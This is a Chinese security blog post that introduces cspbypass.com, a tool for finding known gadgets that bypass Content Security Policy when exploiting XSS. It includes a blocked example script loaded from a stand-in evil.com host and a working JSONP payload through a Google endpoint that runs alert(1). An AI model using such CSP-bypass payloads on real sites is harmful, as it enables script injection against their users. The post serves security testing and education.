---
title: CSP绕过工具：cspbypass
url: https://mp.weixin.qq.com/s/YcVpH_5U_1uVNPA9PZvRRg
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:12:03.049767
---

# CSP绕过工具：cspbypass

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/jow1el0IZibw5XZNnw8NUl2NJhCpZn6MzRibickiaycsx0KcVsiamKYiahYoPvroaUDcZFbicQkuDuUUbz5eZtZ0yiaY36SPgd2UFvhsvR4vsvr7jKw/0?wx_fmt=jpeg)

# CSP绕过工具：cspbypass

原创

Pwn1
Pwn1

漏洞集萃

![]()

在小说阅读器中沉浸阅读

> **免责声明**
> 本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。

在测试一个私有漏洞赏金计划时，我遇到了一个

网站 `https://cspbypass.com/`，是一个专门为了绕过 **Content Security Policy** 而设计的搜索工具。

### **核心功能**

* •

  **智能解析：** 在这个过程里，你可以直接把目标网站上那一整串完整的 `Content-Security-Policy` 的 `header` 给粘贴进去。随后，系统就会自动帮你去识别这里面到底有哪些潜在的风险点。
* •

  **域名检索：** 其支持让你直接输入一个特定的域名，比如像 `facebook.com` 这种。随后，你就能很快地看到在这个域名下面，是不是已经存在一些大家已经知道的、可以用来绕过的接口了。
* •

  **精准匹配：** 它能特别快地给你返回那些能绕过当前这个 `CSP` 策略的 `gadget`、`payload` 或者说是 `endpoint`。在这个时候我们可以看到，它提供的这些方式一般来说还是涵盖了 `JSONP`、`callback` 还有 `trusted-types` 这些比较常见的绕过路径。
* ![](https://mmbiz.qpic.cn/sz_mmbiz_png/jow1el0IZibxELXN8H0qOwHswZMdt9TYG6UhG8X5jicSlODStu9UVfPaCZULgNzicmL6gpfmkbX0wwibgOpyqyH9oMVb62zp2Jp249jsiblD8xzk/640?wx_fmt=png&from=appmsg)

### **使用场景**

那么，关于这个工具的典型使用场景，一般来说是这样的：当你在这个时候发现了一个**反射型**或者是**存储型**的 `XSS` 漏洞，但是你发现页面上偏偏启用了特别严格的 `CSP` 策略。比如说，它可能只允许白名单里的域名去加载脚本。那么在这种时候，你如果用那种很普通的攻击载荷，像 `<script src="//evil.com">` 这种，就肯定会被浏览器给直接拦截掉。

**使用流程**

1. 去分析一下目标网站现在的 `CSP` 策略到底是怎么写的。
2. 去 `cspbypass.com` 里面，搜索那些在白名单里被允许了的域名。
3. 你再从里面寻找一些已经知道的绕过点，接着就可以去尝试进行攻击了。

#### **案例演示**

咱们可以假设一下，当时目标的 `CSP` 策略是下面这个样子的：

```
Content-Security-Policy: script-src 'self' https://www.google.com;
```

那么在这个时候，因为 `google.com` 是在白名单里面的，所以虽然你没法从自己的服务器去加载脚本，但是你还是可以利用 Google 提供的那些受信任的接口来执行你的代码。然后，通过在 `cspbypass.com` 里面搜索，你可能就会找到下面这样一个 `payload`：

```
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
```

**原理：**

其实就是因为浏览器在看这个链接的时候，它会觉得 `google.com` 是一个合法的脚本来源，所以它就会允许这个链接进行加载。随后，Google 的这个接口又会根据你传进去的参数返回一个 `alert(1);`。那么这样一来，就成功绕过了 `CSP` 的拦截限制。

**类似场景：**

* •

  **如果范围被限定了：** 比如说 `CSP` 当时只允许 `google.com` 或者是 `gstatic.com` 这两个域名。
* •

  **那么绕过的思路就是：** 先去搜索 `google.com`。然后，你会获取到一堆 `JSONP` 的 `endpoint`。接着，你再去构造代码来执行像 `alert(document.domain)` 这样的操作。

### **局限性**

虽然说这个工具用起来确实非常强大，但是在下面这些场景发生的时候，它可能还是会失效的：

* •

  **遇到 Strict CSP 的时候：** 如果目标网站采用了那种基于 `nonce`（就是随机数）或者是 `hash`（哈希值）的严格模式，那么这种简单的域名白名单绕过方式，一般来说就没法生效了。
* •

  **接口失效的问题：** 然后，还有一个问题就是，像 Google、GitHub 这些互联网巨头，他们也会定期去修复那些被安全社区给公开出来的 `JSONP` 绕过漏洞。那么，这就导致了工具里的部分 `payload` 可能会随着时间推移，慢慢地就没法再用了。

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[逻辑漏洞：邮箱注册 tips #11](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485053&idx=1&sn=518c8e66c4b2fdf4eb7a0c57c8a28005&scene=21#wechat_redirect)

[一种利用 HTTP 重定向循环的新型 SSRF 技术](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484872&idx=1&sn=085b9ed569eefc9a96122fd164da9707&scene=21#wechat_redirect)

[个人资料/配置页检查清单](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247485039&idx=1&sn=e91b06af4f04ad287b0fd64af41482b0&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

漏洞集萃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过